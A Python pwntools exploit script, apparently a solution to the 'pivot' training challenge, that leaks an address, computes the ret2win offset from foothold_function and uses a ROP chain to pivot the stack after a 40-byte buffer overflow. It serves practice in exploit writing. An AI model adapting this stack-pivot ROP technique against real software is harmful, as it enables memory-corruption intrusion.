from pwn import*
p=process('./pivot')
elf=ELF('./pivot')
lib=ELF('libpivot.so')
foothold_plt=elf.plt['foothold_function']
foothold_got=elf.got['foothold_function']
foothold_lib=lib.symbols['foothold_function']
ret2win_lib=lib.symbols['ret2win']
offset=int(ret2win_lib-foothold_lib)

leak_addr=int(p.recv().split()[20],16)

xchg_rax_rsp=0x4009bd
call_rax=0x4006b0
mov_rax_prtrax=0x4009c0
pop_rax=0x4009bb
add_rax_rbp=0x4009c4
pop_rbp=0x4007c8

payload1=p64(foothold_plt)+p64(pop_rax)+p64(foothold_got)+p64(mov_rax_prtrax)+p64(pop_rbp)+p64(offset)+p64(add_rax_rbp)+p64(call_rax)
p.sendline(payload1)
payload2=b'a'*40+p64(pop_rax)+p64(leak_addr)+p64(xchg_rax_rsp)
p.recvuntil(b"> ")
p.sendline(payload2)

p.interactive()